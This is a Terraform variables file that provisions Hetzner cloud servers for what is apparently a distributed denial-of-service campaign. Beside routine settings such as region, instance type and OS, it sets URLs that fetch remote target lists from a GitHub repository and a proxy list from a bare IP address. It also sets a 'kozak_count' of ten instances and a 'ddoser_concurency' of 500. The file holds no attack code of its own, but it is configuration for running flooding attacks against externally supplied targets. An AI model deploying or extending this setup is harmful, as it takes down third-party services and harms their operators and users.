variable "hcloud_token" {
  type        = string
  sensitive   = true
  description = "Hetzner API Token"
}

variable "locations" {
  type        = list(string)
  default     = ["hel1", "nbg1", "fsn1"]
  description = "Available Hetzner locations"
}

variable "server_type" {
  type        = string
  default     = "cx11"
  description = "Instance type"
}

variable "server_price" {
  type        = number
  default     = 0.007
  description = "Hourly cost per instance"
}

variable "os_type" {
  type        = string
  default     = "ubuntu-20.04"
  description = "Operating system type"
}

variable "targets_file_url" {
  type    = string
  default = "https://raw.githubusercontent.com/hem017/cytro/master/targets_all.txt"
}

variable "special_targets_file_url" {
  type    = string
  default = "https://raw.githubusercontent.com/hem017/cytro/master/special_targets.txt"
}

variable "proxy_file_url" {
  type    = string
  default = "http://143.244.166.15/proxy.list"
}

variable "kozak_count" {
  type    = number
  default = 10
}

variable "ddoser_concurency" {
  type = string
  default = "500"
}